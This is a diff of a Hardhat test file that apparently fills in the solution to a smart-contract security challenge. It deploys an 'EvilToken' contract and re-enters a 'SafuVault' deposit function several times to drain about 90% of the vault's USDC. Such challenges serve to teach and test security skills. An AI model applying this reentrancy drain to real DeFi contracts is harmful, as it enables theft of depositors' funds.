@@ -22,7 +22,7 @@ before(async () => {
   [attacker, o1, o2, admin, usdcAdmin] = accounts;
 
   let usdcFactory = await ethers.getContractFactory('Token')
-  usdc = await usdcFactory.connect(usdcAdmin).deploy('USDC','USDC')
+  usdc = await usdcFactory.connect(usdcAdmin).deploy('USDC', 'USDC')
 
   // attacker gets 10,000 USDC as starting funds
   await usdc.connect(usdcAdmin).mintPerUser(
@@ -34,20 +34,52 @@ before(async () => {
   safuStrategy = await safuStrategyFactory.connect(admin).deploy(usdc.address)
 
   let safuVaultFactory = await ethers.getContractFactory('SafuVault')
-  safuVault = await safuVaultFactory.connect(admin).deploy(safuStrategy.address,'LP Token','LP')
-  
+  safuVault = await safuVaultFactory.connect(admin).deploy(safuStrategy.address, 'LP Token', 'LP')
+
   await safuStrategy.connect(admin).setVault(safuVault.address)
 
   // other user deposits 10_000 USDC into the safu yield vault
-  await usdc.connect(admin).approve(safuVault.address,ethers.constants.MaxUint256)
+  await usdc.connect(admin).approve(safuVault.address, ethers.constants.MaxUint256)
   await safuVault.connect(admin).depositAll()
-  
+
 });
 
 it("solves the challenge", async function () {
+  const evilContract = await ethers.getContractFactory('EvilToken',attacker);
+  
+  let evilToken = await evilContract.deploy(safuVault.address,usdc.address);
+  evilToken = await evilToken.deployed()
 
-  // implement solution here
+  const vaultAttacker = await safuVault.connect(attacker); 
+  const token = await usdc.connect(attacker);
 
+  // * sending funds to the attacking contract.
+  await token.transfer(evilToken.address, precision.mul(10000));
+
+  // * checking the balance.
+  let balance = await evilToken.getShares();
+  console.log("shares before",ethers.utils.formatEther(balance));
+
+  // * first re-entering attack
+  await vaultAttacker.depositFor(evilToken.address,precision.mul(0),await evilToken.address);
+  // * checking the shares held by the contract
+  balance = await evilToken.getShares();
+  console.log("shares after",ethers.utils.formatEther(balance));
+  // * withdrawing USD
+  await evilToken.withdrawAll();
+  // * deposited 10,000 USD and withdrew 15,000 USD -> 5000 USD profit.
+  console.log("balance USD After",ethers.utils.formatEther(await token.balanceOf(evilToken.address)));
+
+  // * second re-entering attack
+  await vaultAttacker.depositFor(evilToken.address,precision.mul(0),evilToken.address);
+  await evilToken.withdrawAll();
+
+  // * third re-entering attack
+  await vaultAttacker.depositFor(evilToken.address,precision.mul(0),evilToken.address);
+  await evilToken.withdrawAll();
+
+  // * finally, withdrawing USD to the attacker's balance
+  await evilToken.withdrawMoney();
 });
 
 /// expected final state
@@ -55,7 +87,8 @@ after(async () => {
 
   // attacker drains >= 90% of funds
   let totalVaultFunds = (await usdc.balanceOf(safuVault.address)) + (await usdc.balanceOf(safuStrategy.address))
-  expect(totalVaultFunds).to.be.lte(precision.mul(1_000))
   expect(await usdc.balanceOf(await attacker.getAddress())).to.be.gte(precision.mul(19_000))
+  expect(totalVaultFunds).to.be.lte(precision.mul(1_000))
   
+
 });
